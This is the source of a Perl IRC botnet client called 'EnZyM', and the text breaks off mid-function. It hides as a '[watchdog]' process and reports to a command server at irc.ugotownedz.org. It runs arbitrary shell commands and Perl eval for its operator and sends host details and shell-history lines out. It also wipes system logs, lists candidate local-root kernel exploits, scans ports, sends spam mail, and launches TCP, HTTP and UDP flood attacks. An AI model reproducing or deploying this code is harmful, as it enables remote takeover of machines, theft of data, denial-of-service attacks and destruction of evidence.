#!/usr/bin/perl

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
use POSIX ":sys_wait_h";
chdir("~/.tmp/.s");
#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
   if ($#_ == '1') {
      my $socket = $_[0];
      print $socket "$_[1]\n";

   } else {
      print $IRC_cur_socket "$_[0]\n";
   }
}

sub getstore ($$)
{
  my $url = shift;
  my $file = shift;
  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}

sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}


sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  $AGENT = "get-minimal";
  $VERSION = "20000118";
  $path =~ s/ /%20/g;

  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;

  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") {
      $b1 = $buf;
      $buf =~ s/.+?\015?\012\015?\012//s;
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);
  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/) {
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }

  return $buf;
}

my $prefix1 = "enz";					
my @nickname = ("EnZ");
my $processo = '[watchdog]';
my $linas_max = '8';
my $sleep = '6';
my $pacotes = 1;
my $nick = $nickname[rand scalar @nickname];
my $ircname = 'EnZyM';
my $realname = `uname -mo`; # chop (my $realname = 'EnZyM');
my $servidor = 'irc.ugotownedz.org' unless $servidor;
my $porta = '6667'; 
my @channels = ("#bot");
my @admins = ("nbz");
my $nbz = 'nbz';
my @hostauth = ("anonym.qc");
my $directory = '~/.tmp/.s';
#my $directory = '/var/tmp/';

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
   PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
      $IRC_cur_socket = $IRC_socket;
      $IRC_socket->autoflush(1);
      $sel_cliente->add($IRC_socket);
      $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
      $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
      nick("$meunick");
      sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname ");
      sleep 1;
   }
}

my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
      $IRC_cur_socket = $fh;
      $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
      $nread = sysread($fh, $msg, 4096);
      if ($nread == 0) {
         $sel_cliente->remove($fh);
         $fh->close;
         delete($irc_servers{$fh});
      }
      @lines = split (/\n/, $msg);
      for(my $c=0; $c<= $#lines; $c++) {
         $line = $lines[$c];
         $line=$line_temp.$line if ($line_temp);
         $line_temp='';
         $line =~ s/\r$//;
         unless ($c == $#lines) {
            parse("$line");
         } else {
            if ($#lines == 0) {
               parse("$line");
            } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
            } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line"); 
            } else {
               $line_temp = $line;
            }
         }
      }
   }
}


sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "".$vers."");
    }
        if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
    if (grep {$_ =~ /^\Q$pn\E$/i } @admins ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }
  
      	### 	if ($arg =~ /^\!(.*)/) {
		###		ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
  
  
  if ($args =~ /^(\Q$meunick\E|\.$prefix1)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1");
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
  
    if ($args =~ /^(\Q$meunick\E|\.enzym)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1");
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}
}

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
  if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
  }
  } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
  nick("$meunick-".int rand(9999));
  } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
  $meunick = $2;
  $MYUPTIME = `uptime`;
  $MYUNAME = `uname -a`;
  $MYRELEASE = `lsb_release -ds`;
  $MYCPUINFO = `cat /proc/cpuinfo | grep "model name" | uniq -c | sed 's/model name//g'`;
  $keyz = 'k3yz';
  $chanz = '#fuck.la.sq';
  @freemem = `free -m | egrep -i 'total|mem'`;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
  $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
  foreach my $canal (@channels) {
        sendraw("MODE $nick +ix");
        sendraw("PART $chanz");
        sendraw("JOIN $canal $keyz");
        sendraw("NOTICE $nbz :.: EnZyM v0.1 :.");
        sendraw("NOTICE $nbz :Distro: $MYRELEASE");
        sendraw("NOTICE $nbz :$MYUPTIME");
        sendraw("NOTICE $nbz :Cpu info: $MYCPUINFO");
        sendraw("NOTICE $nbz :$MYUNAME");
	foreach my $freemem (@freemem) { 
		sendraw("NOTICE $nbz :$freemem");
	}
}
}


sub bfunc {
   my $printl = $_[0];
   my $funcarg = $_[1];
   if (my $pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {

######################
#  Commands          #
######################

######################
#   End of  Help     #
######################

######################
#     SYSTEM  INFO   #
######################
         if ($funcarg =~ /^system/) {
            $uname = `uname -a`;
            $uptime = `uptime`;
            $distro = `lsb_release -ds`;
            $cpuinfo = `cat /proc/cpuinfo | grep "model name" | uniq -c | sed 's/model name//g'`;
            @freemem = `free -m | egrep -i 'total|mem'`;
            sendraw($IRC_cur_socket, "PRIVMSG $printl :.: EnZyM v0.1 :.");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :$uptime");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :OS: $distro");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :CPU: $cpuinfo");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :$uname");
            	foreach my $freemem (@freemem) { 
			sendraw($IRC_cur_socket, "PRIVMSG $printl :$freemem");
	}
}

######################
#      Portscan      #
######################
         if ($funcarg =~ /^portscan (.*)/) {
            $hostip = "$1";
            @portas=("21","22","80","5900","8080","8081");
            my (@aberta, %porta_banner);
            sendraw($IRC_cur_socket, "PRIVMSG $printl :Scanning for open ports on ".$1." started.");
            foreach my $porta (@portas)  {
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
                  'tcp', Timeout => 4);
               if ($scansock) {
                  push (@aberta, $porta);
                  $scansock->close;
               }
            }
 
            if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Open ports: @aberta");
            } else {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :No open ports.");
            }
         }
      
######################
#  Log Cleaner user  # 
######################
if ($funcarg =~ /^cleanlog/) {
    system 'history -w';
    system 'history -c';
    system 'rm -rf ~/.*_history';
    system 'touch ~/.bash_history';
    system 'chmod 600 ~/.bash_history';
		sendraw($IRC_cur_socket, "PRIVMSG $printl :Done. ~/.*_history cleaned.");
}

######################
# End of Log Cleaner # 
######################

#######################
# NOTICE bash_history    # 
#######################

if ($funcarg =~ /^log/) {
		@noticelog = `cat ~/.*_history | egrep -i "wget|curl|fetch|tftp|ftp|ssh|get"`;
	    $nbz="nbz";
	    sendraw($IRC_cur_socket, "NOTICE $nbz :Trying find source in ~/.*_history");
	foreach my $noticelog (@noticelog) {                                                               
		sendraw($IRC_cur_socket, "NOTICE $nbz :$noticelog ");
} 
		sleep 1;
		sendraw($IRC_cur_socket, "NOTICE $nbz :Done. Clear log ? .$prefix1 @clearlog");
}

#######################
# End of bash_history # 
#######################

####################
####### DNS  #######
####################

if ($funcarg =~ /^dns\s+(.*)/){ 
    $nsku = $1;
    $mydns = inet_ntoa(inet_aton($nsku));
    sendraw($IRC_cur_socket, "PRIVMSG $printl :Resolved: $nsku to $mydns");
}

####################
####  END OF DNS  ##
####################

#########################
#         SSH           # 
#########################

if ($funcarg =~ /^pwd/) {
	$pwd = `pwd`;
		sendraw($IRC_cur_socket, "NOTICE $nbz :[pwd]");
		sendraw($IRC_cur_socket, "NOTICE $nbz :$pwd");
}

if ($funcarg =~ /^mfu/) {
$numberLines = 0;
$mfu = "mfu.txt";
open(FILE, $mfu);			
while (my $ligne = <FILE>) {
           $numberLines ++;
}
close (FILE);
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Servers Open: $numberLines]");
}

######################
#  Log Cleaner root  # 
######################
if ($funcarg =~ /^clearlogroot/) {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :Clean all history and logs...");
   system 'rm -rf /etc/wtmp';
   system 'rm -rf /var/run/utmp';
   system 'rm -rf /etc/utmp';
   system 'rm -rf /var/log*';
   system 'rm -rf /var/adm';
   system 'rm -rf /var/apache/log*';
   system 'rm -rf /usr/local/apache/log*';
   system 'rm -rf /root/.*history';
		sendraw($IRC_cur_socket, "PRIVMSG $printl :All default log and bash_history files erased");
      sleep 1;
		sendraw($IRC_cur_socket, "PRIVMSG $printl :Now Erasing the rest of the machine log files");
   system 'find / -name *.*_history -exec rm -rf {} \;';
   system 'find / -name *.*_logout -exec rm -rf {} \;';
   system 'find / -name "log*" -exec rm -rf {} \;';
   system 'find / -name *.log -exec rm -rf {} \;';
      sleep 1;
		sendraw($IRC_cur_socket, "PRIVMSG $printl :Done! all logs erased.");
      }

######################
#     Rootable       #
######################
if ($funcarg =~ /^rootable/) { 
my $khost = `uname -r`;
sendraw($IRC_cur_socket, "PRIVMSG $printl :The kernel of this box is ".$khost." ");
chomp($khost);

   my %h;
   $h{'w00t'} = { 
      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20'] 
   };
   
   $h{'brk'} = {
      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20'] 
   };
   
   $h{'ave'} = {
      vuln=>['2.4.19','2.4.20'] 
   };
   
   $h{'elflbl'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'elfdump'} = {
      vuln=>['2.4.27']
   };
   
   $h{'expand_stack'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'h00lyshit'} = {
      vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']
   };
   
   $h{'kdump'} = {
      vuln=>['2.6.13'] 
   };
   
   $h{'km2'} = {
      vuln=>['2.4.18','2.4.22']
   };
   
   $h{'krad'} = {
      vuln=>['2.6.11']
   };
   
   $h{'krad3'} = {
      vuln=>['2.6.11','2.6.9']
   };
   
   $h{'local26'} = {
      vuln=>['2.6.13']
   };
   
   $h{'loko'} = {
      vuln=>['2.4.22','2.4.23','2.4.24'] 
   };
   
   $h{'mremap_pte'} = {
      vuln=>['2.4.20','2.2.25','2.4.24'] 
   };
   
   $h{'newlocal'} = {
      vuln=>['2.4.17','2.4.19','2.4.18'] 
   };
   
   $h{'ong_bak'} = {
      vuln=>['2.4.','2.6.'] 
   };
   
   $h{'ptrace'} = {
      vuln=>['2.2.','2.4.22'] 
   };
   
   $h{'ptrace_kmod'} = {
      vuln=>['2.4.2'] 
   };
   
   $h{'ptrace24'} = {
      vuln=>['2.4.9'] 
   };
   
   $h{'pwned'} = {
      vuln=>['2.4.','2.6.'] 
   };
   
   $h{'py2'} = {
      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13'] 
   };
   
   $h{'raptor_prctl'} = {
      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13'] 
   };
   
   $h{'prctl3'} = {
      vuln=>['2.6.13','2.6.17','2.6.9'] 
   };
   
   $h{'remap'} = {
      vuln=>['2.4.'] 
   };
   
   $h{'rip'} = {
      vuln=>['2.2.'] 
   };
   
   $h{'stackgrow2'} = {
      vuln=>['2.4.29','2.6.10'] 
   };
   
   $h{'uselib24'} = {
      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25'] 
   };
   
   $h{'newsmp'} = {
      vuln=>['2.6.'] 
   };
   
   $h{'smpracer'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'loginx'} = {
      vuln=>['2.4.22'] 
   };
   
   $h{'exp.sh'} = {
      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13'] 
   };
   
   $h{'prctl'} = {
      vuln=>['2.6.'] 
   };
   
   $h{'kmdx'} = {
      vuln=>['2.6.','2.4.'] 
   };
   
   $h{'raptor'} = {
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
   };
   
   $h{'raptor2'} = {
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
   };
   
foreach my $key(keys %h){
foreach my $kernel ( @{ $h{$key}{'vuln'} } ){ 
   if($khost=~/^$kernel/){
   chop($kernel) if ($kernel=~/.$/);
   sendraw($IRC_cur_socket, "PRIVMSG $printl :Possible Local Root Exploits: ". $key ." ");
      }
      else {
	select(undef, undef, undef, 0.25);
        sendraw($IRC_cur_socket, "PRIVMSG $printl :No rootable with ". $key ." on kernel ". $kernel ." ");
     }
   }
}
}

######################
#       MAILER       # 
######################

if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]  Mailer :. |  Sending Mail to : 2 $3");
$subject = $1;
$sender = $2;
$recipient = $3;
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n";
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]   Mailer :. |  Mail Sent To : 2 $recipient");
}
######################
#   End of MAILER    # 
######################

######################
#   TMP CLEANER      #
######################

if ($funcarg =~ /^cleartmp/) { 
    system 'cd /tmp ; rm -rf * 2>/dev/null';
         sendraw($IRC_cur_socket, "PRIVMSG $printl :[/tmp cleaned.]");
         }

######################
#   END TPM CLEANER  #
######################

##########
#  IRC   #
##########
         
         if ($funcarg =~ /^nick (.*)/) {
            sendraw($IRC_cur_socket, "NICK ".$1);
         }
         if ($funcarg =~ /^say (.*)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl ".$1);
         }
         
         ######## msg ######
         if ($funcarg =~ /^msg (.*)/) {
            sendraw($IRC_cur_socket, "PRIVMSG ".$1); # .$2 ??
         }
         ######## end msg #######
         
         if ($funcarg =~ /^join (.*)/) {
            sendraw($IRC_cur_socket, "JOIN ".$1);
         }
         if ($funcarg =~ /^part (.*)/) {
            sendraw($IRC_cur_socket, "PART ".$1);
         }
         if ($funcarg =~ /^cycle (.*)/) {
            sendraw($IRC_cur_socket, "CYCLE ".$1);
         }
         if ($funcarg =~ /^voice (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl +v ".$1);
           }
         if ($funcarg =~ /^devoice (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl -v ".$1);
           }
         if ($funcarg =~ /^op (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl +o ".$1);
           }         
         if ($funcarg =~ /^deop (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl -o ".$1);
           }
           
           
###########
# End IRC #
###########

######################
#     TCPFlood       #
######################

         if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TCP-DDOS12] Attacking 4 ".$1.":".$2." 12for 4 ".$3." 12seconds.");
            my $itime = time;
            my ($cur_time);
            $cur_time = time - $itime;
            while ($3>$cur_time){
               $cur_time = time - $itime;
               &tcpflooder("$1","$2","$3");
            }
            sendraw($IRC_cur_socket,"PRIVMSG $printl :12[4@3TCP-DDOS12] Attack done 4 ".$1.":".$2.".");
         }
######################
#  End of TCPFlood   #
######################

######################
#  SQL Fl00dEr       #
######################

if ($funcarg =~ /^sqlflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking 4 ".$1." 12 on port 3306 for 4 ".$2." 12 seconds .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
   my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);
   print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking done 4 ".$1.".");
}


######################
#     HTTPFlood      #
######################
         if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking 4 ".$1." 12 on port 80 for 4 ".$2." 12 seconds .");
            my $itime = time;
            my ($cur_time);
            $cur_time = time - $itime;
            while ($2>$cur_time){
               $cur_time = time - $itime;
               my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
               print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
               close($socket);
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking done 4 ".$1.".");
         }
######################
#  End of HTTPFlood  #
######################


####################
####### UDP1 #######
####################

if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
    return unless $pacotes;
    socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
    my $alvo=inet_aton("$1");
    my $porta = "$2";
    my $dtime = "$3";
    my $pacote;
    my $pacotese;
    my $size = 0;
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 w0rmer] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
    while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
            $pacote = $size ? $size : int(rand(1024-64)+64) ;
            $porta = int(rand 65000) +1 if ($porta == "0");
            #send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo));
            send(Tr0x, pack("a$pacote","Tr0x"), 0, pack_sockaddr_in($porta, $alvo));
            }
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 w0rmer] 9,1Attack for 12".$1." 9,1finished in 12".$dtime." 9,1seconds9,1. ");
}

#####################
##   END OF UDP1    #
#####################


####################
####### UDP2 #######
####################

if ($funcarg =~ /^udp2\s+(.*)\s+(\d+)\s+(\d+)/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 w0rmer] 9,1Attacking 12".$1." 9,1with 12".$2." 9,1Kb Packets for 12".$3." 9,1seconds. ");
    my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
    $dtime = 1 if $dtime == 0;
    my %bytes;
    $bytes{igmp} = $2 * $pacotes{igmp};
    $bytes{icmp} = $2 * $pacotes{icmp};
    $bytes{o} = $2 * $pacotes{o};
    $bytes{udp} = $2 * $pacotes{udp};
    $bytes{tcp} = $2 * $pacotes{tcp};
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 w0rmer] 9,1Results 12".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
}

#####################
##   END OF UDP2    #
#####################

####################
####### UDP3 #######
####################

if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
    return unless $pacotes;
    socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
    my $alvo=inet_aton("$1");
    my $porta = "$2";
    my $dtime = "$3";
    my $pacote;
    my $pacotese;
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 w0rmer] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
    while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
            $pacote= $rand x $rand x $rand;
            $porta = int(rand 65000) +1 if ($porta == "0");
            send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
            }
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 w0rmer] 9,1Results 12".$pacotese." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
}
#####################
##   END OF UDP3    #
#####################
         exit;
      }

sub ircase {
   my ($kem, $printl, $case) = @_;
   if ($case =~ /^join (.*)/) {
      j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
         for (my $ca = 1; $ca <= $1; $ca++ ) {
            p("$2");
            j("$2");
         }
      } else {
         p("$chan");
         j("$chan");
      }
   }

   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }

   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
         msg("$2", "$3");
      }
   }

   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }

   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }

   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
      conectar("$2", "$1", 6667);
   }

   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }

   if ($case =~ /^eval (.*)/) {
      eval "$1";
   }
}

sub get_html() {
$test=$_[0];

      $ip=$_[1];
      $port=$_[2];

my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
if(defined($ip) && defined($port)) {
      $ua->proxy("http","http://$ip:$port/");
      $ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
}
$ua->timeout(1);
my $response=$ua->request($req);
if ($response->is_success) {
   $re=$response->content;
}
return $re;
}

sub addproc {

   my $proc=$_[0];
   my $dork=$_[1];
   
   open(FILE,">>/var/tmp/pids");
   print FILE $proc." [".$irc_servers{$IRC_cur_socket}{'nick'}."] $dork\n";
   close(FILE);
}


sub delproc {

   my $proc=$_[0];
   open(FILE,"/var/tmp/pids");

   while(<FILE>) {
      $_ =~ /(\d+)\s+(.*)/;
      $childs{$1}=$2;
   }
   close(FILE);
   delete($childs{$proc});

   open(FILE,">/var/tmp/pids");

   for $klucz (keys %childs) {
      print FILE $klucz." ".$childs{$klucz}."\n";
   }
}

sub shell {
   my $printl=$_[0];
   my $comando=$_[1];
   if ($comando =~ /cd (.*)/) {
      chdir("$1") || msg("$printl", "No such file or directory");
      return;
   } elsif ($pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {
         my @resp=`$comando 2>&1 3>&1`;
         my $c=0;
         foreach my $linha (@resp) {
            $c++;
            chop $linha;
            sendraw($IRC_cur_socket, "NOTICE $nbz :$linha");
            if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
            }
         }
         exit;
      }
   }
}

sub tcpflooder {
   my $itime = time;
   my ($cur_time);
   my ($ia,$pa,$proto,$j,$l,$t);
   $ia=inet_aton($_[0]);
   $pa=sockaddr_in($_[1],$ia);
   $ftime=$_[2];
   $proto=getprotobyname('tcp');
   $j=0;$l=0;
   $cur_time = time - $itime;
   while ($l<1000){
      $cur_time = time - $itime;
      last if $cur_time >= $ftime;
      $t="SOCK$l";
      socket($t,PF_INET,SOCK_STREAM,$proto);
      connect($t,$pa)||$j--;
      $j++;
      $l++;
   }
   $l=0;
   while ($l<1000){
      $cur_time = time - $itime;
      last if $cur_time >= $ftime;
      $t="SOCK$l";
      shutdown($t,2);
      $l++;
   }
}

sub udpflooder {
   my $iaddr = inet_aton($_[0]);
   my $msg = 'A' x $_[1];
   my $ftime = $_[2];
   my $cp = 0;
   my (%pacotes);
   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
   return(undef) if $cp == 4;
   my $itime = time;
   my ($cur_time);
   while ( 1 ) {
      for (my $porta = 1; $porta <= 65000; $porta++) {
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
         send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
         send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
         send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
         for (my $pc = 3; $pc <= 255;$pc++) {
            next if $pc == 6;
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
         }
      }
      last if $cur_time >= $ftime;
   }
   return($cur_time, %pacotes);
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}

sub j {
   &join(@_);
}

sub join {
   return unless $#_ == 0;
